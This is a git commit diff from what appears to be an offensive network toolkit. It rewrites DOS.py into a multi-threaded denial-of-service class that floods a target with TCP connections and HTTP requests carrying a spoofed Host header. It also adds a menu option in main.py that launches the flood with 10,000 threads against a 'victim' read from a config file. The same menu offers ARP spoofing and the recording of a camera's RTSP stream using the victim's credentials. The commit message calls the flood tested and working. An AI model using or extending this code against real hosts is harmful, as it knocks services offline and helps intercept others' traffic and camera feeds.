881dc6d4fb72f98e7512da937f6a8d6ea3f2b516
deniz0zn <119049752+deniz0zn@users.noreply.github.com>
2024-06-18 19:51:32 +0200

    DOS py is adjusted and tested. Succesfully working. DOS option is also integrated into the main.py as well

--- DOS.py
+++ DOS.py
@@ -1,17 +1,42 @@
-from scapy.all import IP, TCP, send
+import socket
+import threading
 import time
 
-def send_packets(destination_ip, destination_port, duration, rate):
-    packet = IP(dst=destination_ip) / TCP(dport=destination_port)
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        send(packet)
-        time.sleep(1 / rate)
+class DOSAttack:
+    def __init__(self, target, port, thread_count, fake_ip, duration):
+        self.target = target
+        self.port = port
+        self.thread_count = thread_count
+        self.fake_ip = fake_ip
+        self.duration = duration
+        self.start_time = time.time()
+        self.packet_count = 0
+        self.lock = threading.Lock()
 
-# Example usage:
-if __name__ == "__main__":
-    target_ip = "192.168.88.123"
-    target_port = 8080
-    duration = 60*5  # duration in seconds
-    rate = 100  # packets per second
-    send_packets(target_ip, target_port, duration, rate)
+    def attack(self):
+        while time.time() - self.start_time < self.duration:
+            try:
+                with self.lock:
+                    self.packet_count += 1  # Increment the packet count
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.target, self.port))
+                s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
+                s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
+                s.close()
+            except Exception as e:
+                with open("dos_errors.log", "a") as log_file:
+                    log_file.write(f"Error: {e}\n")
+
+    def start_attack(self):
+        for i in range(self.thread_count):
+            thread = threading.Thread(target=self.attack)
+            thread.start()
+        self.report_packets()
+
+    def report_packets(self):
+        start_reporting = time.time()
+        while time.time() - start_reporting < self.duration:
+            time.sleep(30)  # Wait for 30 seconds before reporting
+            with self.lock:
+                print(f"\nPackets sent in the last 30 seconds: {self.packet_count}")
+                self.packet_count = 0  # Reset the counter after reporting
--- main.py
+++ main.py
@@ -1,3 +1,4 @@
+import sys
 import threading
 from time import sleep
 
@@ -6,7 +7,6 @@ class TargetLoader:
         self.filepath = filepath
 
     def load_targets(self):
-        """Load target information from the file."""
         config = {}
         with open(self.filepath, 'r') as file:
             for line in file:
@@ -37,18 +37,33 @@ class Menu:
         username = target_info['username']
         password = target_info['password']
         url = f"rtsp://{username}:{password}@{victim_ip}/channel1"
-
         recorder = StreamRecorder(url, format='mkv')
         record_thread = threading.Thread(target=recorder.record)
         record_thread.start()
         self.running_tasks.append(record_thread)
         print("Network recording started...")
 
+    def run_dos_attack(self):
+        from DOS import DOSAttack
+        target_info = self.loader.load_targets()
+        try:
+            duration = int(input("Enter the duration of the DOS attack in seconds: "))
+        except ValueError:
+            print("Invalid input! Using default duration of 60 seconds.")
+            duration = 60
+        dos = DOSAttack(target=target_info['victim'], port=8080, thread_count=10000, fake_ip='44.197.175.168',
+                        duration=duration)
+        dos_thread = threading.Thread(target=dos.start_attack)
+        dos_thread.start()
+        self.running_tasks.append(dos_thread)
+        print(f"DOS attack started for {duration} seconds...")
+
     def display_menu(self):
-        print("Select an option:")
+        print("\n\nSelect an option:")
         print("1. Run ARP Spoofing")
         print("2. Run Network Recording")
-        print("3. Stop all tasks and Exit")
+        print("3. Run DOS Attack")
+        print("4. Stop all tasks and Exit")
 
     def execute_choice(self, choice):
         if choice == '1':
@@ -56,20 +71,26 @@ class Menu:
         elif choice == '2':
             self.run_network_recording()
         elif choice == '3':
+            self.run_dos_attack()
+        elif choice == '4':
+            print("Stopping all tasks and exiting...")
             for task in self.running_tasks:
                 if task.is_alive():
-                    task.join()  # Wait for the task to finish if it's still running
-            print("Exiting program.")
+                    task.join(1)  # Wait for 1 second for thread to respond
             exit()
         else:
             print("Invalid choice. Please try again.")
 
 def main():
     menu = Menu()
-    while True:
-        menu.display_menu()
-        choice = input("Enter your choice: ")
-        menu.execute_choice(choice)
+    try:
+        while True:
+            menu.display_menu()
+            choice = input("Enter your choice: ")
+            menu.execute_choice(choice)
+    except KeyboardInterrupt:
+        print("\nMenu interrupted by user. Exiting.")
+        sys.exit(0)
 
 if __name__ == "__main__":
     main()
